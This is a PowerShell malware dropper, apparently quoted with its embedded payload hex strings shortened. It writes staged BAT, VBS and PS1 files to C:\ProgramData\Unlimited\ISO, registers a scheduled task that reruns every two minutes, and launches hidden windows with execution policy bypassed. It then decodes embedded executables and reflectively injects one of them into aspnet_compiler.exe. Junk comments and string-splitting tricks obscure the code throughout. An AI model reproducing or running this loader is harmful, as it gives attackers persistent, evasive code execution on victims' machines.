$a = "C:\ProgramData\Unlimited\ISO"
New-Item $a -ItemType Directory -Force
$Content = @'
PowerShell -NoProfile -ExecutionPolicy Bypass -Command C:\ProgramData\Unlimited\ISO\Binnot.ps1
'@
Set-Content -Path C:\ProgramData\Unlimited\ISO\Binnot.bat -Value $Content
$Content = @'
$x = <#__ـــــــــ__#><#__ـــــــــ__#><#__ـــــــــ__#><#__ـــــــــ__#><#__ـــــــــ__#> New-ScheduledTaskAction <#__ـــــــــ__#> -Execute <#__ـــــــــ__#><#__ـــــــــ__#><#__ـــــــــ__#><#__ـــــــــ__#><#__ـــــــــ__#>'C:\ProgramData\Unlimited\ISO\Unlimited.vbs'
$a = <#__ـــــــــ__#><#__ـــــــــ__#><#__ـــــــــ__#><#__ـــــــــ__#><#__ـــــــــ__#> New-ScheduledTaskTrigger <#__ـــــــــ__#> -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 2)
Register-ScheduledTask <#__ـــــــــ__#> -Action $x -Trigger $a <#__ـــــــــ__#> -TaskName <#__ـــــــــ__#>"Unlimited"
'@
Set-Content -Path C:\ProgramData\Unlimited\ISO\Binnot.ps1 -Value $Content
$Content = @'
on error resume next
WScript.Sleep(5000)
Set WshShell = CreateObject("WScript.Shell")  
WshShell.Run chr(34) & "C:\ProgramData\Unlimited\ISO\Binnot.bat" & Chr(34), 0  
Set WshShell = Nothing  
'@
Set-Content -Path C:\ProgramData\Unlimited\ISO\Binnot.vbs -Value $Content
$Content = @'
on error resume next
WScript.Sleep(5000)
Set WshShell = CreateObject("WScript.Shell")  
WshShell.Run chr(34) & "C:\ProgramData\Unlimited\ISO\Unlimited.bat" & Chr(34), 0  
Set WshShell = Nothing  
'@
Set-Content -Path C:\ProgramData\Unlimited\ISO\Unlimited.vbs -Value $Content
$Content = @'
PowerShell -NoProfile -ExecutionPolicy Bypass -Command C:\ProgramData\Unlimited\ISO\Unlimited.ps1
'@
Set-Content -Path C:\ProgramData\Unlimited\ISO\Unlimited.bat -Value $Content
$Content = @'
    start-sleep 3
Function Binary2String([String] $data) {
    $byteList = [<#_(**^&@!%%&&#>System.Collections.Generic.List[<#_(**^&@!%%&&#>Byte<#_(**^&@!%%&&#>]]::new()
    for ($i = 0; $i -lt $data.Length; $i +=8) {
        $byteList.Add([<#_(**^&@!%%&&#>Convert<#_(**^&@!%%&&#>]::ToByte($data.Substring($i, 8), 2))
    }
    return [<#_(**^&@!%%&&#>System.Text.Encoding<#_(**^&@!%%&&#>]::ASCII.GetString(<#_(**^&@!%%&&#>$byteList.ToArray())
}
  try 
    {
Function Convert-HexToByte([String] $data) {
    $bytes = New-Object -TypeName byte[] -ArgumentList ($data.Length / 2)
    for ($i = 0; $i -lt $data.Length; $i += 2) {
        $bytes[$i / 2] = [<#_(**^&@!%%&&#>Convert<#_(**^&@!%%&&#>]::ToByte($data.Substring($i, 2), 16)
    }
    return [byte[]]$bytes
}
        } catch { }
 try 
    {
         start-sleep 3
[byte[<#_(**^&@!%%&&#>]<#_(**^&@!%%&&#>]<#_(**^&@!%%&&#>$Stod5<#_(**^&@!%%&&#> = <#_(**^&@!%%&&#>Convert-HexToByte(<#_(**^&@!%%&&#>"4D5A9...000") # The omitted "4D5A9...000" is actually a 124929 character long hexadecimal string.
[byte[<#_(**^&@!%%&&#>]<#_(**^&@!%%&&#>]<#_(**^&@!%%&&#>$Stod08 = <#_(**^&@!%%&&#>Convert-HexToByte(<#_(**^&@!%%&&#>"4D5A...000") # The omitted "4D5A...000" is actually a 142337 character long hexadecimal string.
   } catch { }
    try 
    {
$IFFFD = "LZXXZ".Replace("ZXXZ","oad")
  $zz = $IFFFD
  $get = "GeLZXXZ".Replace("LZXXZ","tMethod")
  $get1 = $get
 $dddd = (Binary2String("01000101011110000110010101100011011101010111010001100101"))
[<#_(**^&@!%%&&#>Reflection.Assembly<#_(**^&@!%%&&#>]::$zz(<#_(**^&@!%%&&#>$Stod08<#_(**^&@!%%&&#>).'Gettype'('GIT.local').$get1($dddd).Invoke($null,('C*****************:\Windo*****************ws\Micros*****************oft.NEt\F*****************ramework\*****************v4.0.30319*****************\asp*****************net_com*****************piler.e*****************xe'.Replace("*****************",""),$Stod5))
$VBX = "Fra*@~!~!~!~!@".Replace("*@~!~!~!~!@","mework64")
$SEWYSU = "Fra*%^%#CVS".Replace("*%^%#CVS","mework")
$SEWYSU + $VBX
} catch { }
'@
Set-Content -Path C:\ProgramData\Unlimited\ISO\Unlimited.ps1 -Value $Content
<#__ـــــــــ__#>
start-Sleep 6
start C:\ProgramData\Unlimited\ISO\Binnot.vbs